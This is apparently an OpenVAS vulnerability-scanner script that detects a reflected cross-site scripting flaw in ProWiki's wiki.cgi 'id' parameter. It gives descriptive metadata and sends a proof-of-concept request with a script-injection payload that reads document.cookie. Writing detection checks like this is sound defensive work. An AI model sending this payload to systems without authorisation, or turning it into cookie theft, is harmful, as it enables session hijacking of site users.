if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802609" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-02-13 16:16:16 +0530 (Mon, 13 Feb 2012)" );
	script_name( "ProWiki 'id' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/109626/prowiki-xss.txt" );
	script_xref( name: "URL", value: "http://st2tea.blogspot.in/2012/02/prowiki-cross-site-scripting.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "ProWiki versions 2.0.045 and prior." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input
  to the 'id' parameter in 'wiki.cgi' (when 'action' is set to 'browse'), which
  allows attackers to execute arbitrary HTML and script code in a user's
  browser session in the context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running ProWiki and is prone to cross site scripting
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/prowiki", "/wiki", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: NASLString( dir, "/wiki.cgi" ), port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!isnull( res ) && ContainsString( res, ">ProWiki" )){
		url = dir + "/wiki.cgi?action=browse&id=><script>alert(document.cookie)" + "</script>'";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

